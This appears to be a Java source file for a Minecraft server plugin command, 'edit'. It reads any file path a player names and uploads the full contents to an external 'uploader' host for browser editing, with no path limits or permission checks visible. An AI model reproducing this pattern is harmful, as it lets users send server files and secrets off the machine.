package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class Edit implements Command {
    private final ArrayList<String> disallowedSuffix = new ArrayList<>();
    private final HashMap<String, String[]> confirmCreates = new HashMap<String, String[]>();

    @Override
    public String[] getCommands() {
        return new String[]{"edit"};
    }

    @Override
    public String getDescription() {
        return "Edit a file in a browser and save on server.";
    }

    @Override
    public void onEnable(Z_ z) {
        disallowedSuffix.add(".jar");
        disallowedSuffix.add(".exe");
        disallowedSuffix.add(".gz");
        disallowedSuffix.add(".tar");
        disallowedSuffix.add(".zip");
        disallowedSuffix.add(".dat");
        disallowedSuffix.add(".lock");
        disallowedSuffix.add(".mca");
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "edit <file>");
            return;
        }

        String filename = String.join(" ", args);
        ArrayList<String> lines = new ArrayList<>();

        File found = new File(filename);
        if (found.isDirectory()) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "You cannot edit directories!");
            return;
        }

        if (!found.exists()) {
            if (!confirmCreates.containsKey(sender.getName())) {
                sender.sendMessage(Colors.Prefix + Colors.Caution + "Running that will create that file. Run the same command again if you want to create it.");
                confirmCreates.put(sender.getName(), context.getArgs());
                return;
            } else {
                String[] currentArgs = confirmCreates.get(sender.getName());
                if (!Arrays.equals(currentArgs, args)) {
                    sender.sendMessage(Colors.Prefix + Colors.Caution + "Running that will create that file. Run the same command again if you want to create it.");
                    confirmCreates.put(sender.getName(), context.getArgs());
                    return;
                }

                confirmCreates.remove(sender.getName());
            }

            lines.add("# EMPTY FILE - WILL CREATE ON SAVE");
        } else {
            try {
                confirmCreates.remove(sender.getName());
            } catch (Exception ignored) {

            }

            for (String disallowed : this.disallowedSuffix) {
                if (filename.endsWith(disallowed) || !filename.contains(".")) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + "You cannot modify that type of file! Consider uploading then downloading a new file to that location.");
                    return;
                }
            }

            try (BufferedReader br = new BufferedReader(new FileReader(found))) {
                String line;
                while ((line = br.readLine()) != null) {
                    lines.add(line);
                }
            } catch (IOException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }
        }


        if (lines.size() == 0) {
            lines.add("# EMPTY FILE - WILL CREATE ON SAVE");
        }

        Reader reader;

        try {
            URL url = new URL(context.getZ_().uploader + "/upload_editor");
            Map<String, Object> params = new LinkedHashMap<>();
            params.put("text", String.join("\n", lines));
            params.put("original", filename);

            StringBuilder postData = new StringBuilder();
            for (Map.Entry<String, Object> param : params.entrySet()) {
                if (postData.length() != 0) postData.append('&');
                postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
                postData.append('=');
                postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
            }
            byte[] postDataBytes = postData.toString().getBytes(StandardCharsets.UTF_8);

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
            conn.setDoOutput(true);
            conn.getOutputStream().write(postDataBytes);

            reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        String sb = Utilities.getStringFromBuffer(reader);

        if (sb.length() == 0) {
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Caution + sb);
    }
}
